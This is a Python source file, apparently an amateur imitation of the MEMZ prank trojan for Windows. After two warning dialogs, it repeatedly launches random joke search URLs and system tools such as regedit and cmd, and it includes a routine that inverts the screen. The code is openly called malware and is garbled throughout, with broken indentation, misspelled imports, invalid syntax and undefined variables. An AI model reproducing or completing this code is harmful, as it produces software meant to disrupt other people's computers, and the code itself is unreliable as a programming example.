#Python
# Made by Frank

from win32api import *
from win32gui import *
from win32ui import *
from ctypes import windll 
from win32con import *
from win32file import *
from random import Randrange as rd 
from random import *
from sys import exit
import multiprocessing 

#Imports
# Message box 1 warning

def warning():
if  Messagebox("The Software you just executed is considered a malware. If you don't know what a malware is then press simply No and nothing will happen\nThis malware will harm your computer, 
                              "Frank South 20", 
   
                           MB_YESNO | MB_ICONWARNING) == 7:
            exit()
            
if  Messagebox("This is the last warning!\n The creator Frank South 20 is not responsible for any damage made using this malware!\n Still execute it?",
                             "Frank South 20", 
   
                          MB_YESNO | MB_ICONWARNING) == 7:
            exit()
  
  # Website payload 
  class Data:
  sites = (
    "http://google.co.ck/search?q=best+way+to+kill+yourself",
	"http://google.co.ck/search?q=how+2+remove+a+virus",
	"http://google.co.ck/search?q=mcafee+vs+norton",
	"http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
	"http://google.co.ck/search?q=minecraft+hax+download+no+virus",
	"http://google.co.ck/search?q=how+to+get+money",
	"http://google.co.ck/search?q=bonzi+buddy+download+free",
	"http://google.co.ck/search?q=how+2+buy+weed",
	"http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
	"http://google.co.ck/search?q=what+happens+if+you+delete+system32",
	"http://google.co.ck/search?q=g3t+r3kt",
	"http://google.co.ck/search?q=batch+virus+download",
	"http://google.co.ck/search?q=virus.exe",
	"http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
	"http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
	"http://google.co.ck/search?q=virus+builder+legit+free+download",
	"http://google.co.ck/search?q=how+to+create+your+own+ransomware",
	"http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	"http://google.co.ck/search?q=dank+memz",
	"http://google.co.ck/search?q=half+life+3+release+date",
	"http://google.co.ck/search?q=is+illuminati+real",
	"http://google.co.ck/search?q=montage+parody+making+program+2016",
	"http://google.co.ck/search?q=the+memz+are+real",
	"http://google.co.ck/search?q=stanky+danky+maymays",
	"http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
	"http://google.co.ck/search?q=vinesauce+meme+collection",
	"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
	"http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
	"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
	"http://play.clubpenguin.com",
	"http://pcoptimizerpro.com",
	"http://softonic.com",
	"calc",
	"notepad",
	"cmd",
	"write",
	"regedit",
	"explorer",
	"taskmgr",
	"msconfig",
	"mspaint",
	"devmgmt.msc",
	"control",
	"mmc"  
  )
  
  times   = 0
  timeSubtract = 1500
  
  
                  class Payloads:
        def open_sites():
                    global timeSubtract
                    sites = Data.sites
                    global time
                    for i in range(0, 10): #While True
                     __import__("os").system("start " + str(choice(sites)))
                    Sleep(timeSubtract-time)
       def decrease_timer():
                     global time
                     while time < 15000:
                          time ++ 1
                           Sleep(10)
                       def blink_screen():
                         global time
                         global timeSubstract 
                         HDC = GetDC(0) # Get the first monitor
                         sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) 
                         while True:
                           Sleep(timeSubtract-time)
                           PatBlt(HDC, 0,0,x,y, PATINVERT)
        def EnumChildProc(hwnd, Lparom): #Issue!!!
                           
                           
         
                 
  if  __name__ == ' __main__' :                                
     p = Payloads()
           
                 opensites = multiprocessing.Process(target = p.open_sites)
                 timersub = multiprocessing.Process(target = p.decrease_timer)
                 opensites.start()
                 timersub.start()
                 Sleep(10000)
                opensites.terminate()
                timersub.terminate()
                
                 
                  
                
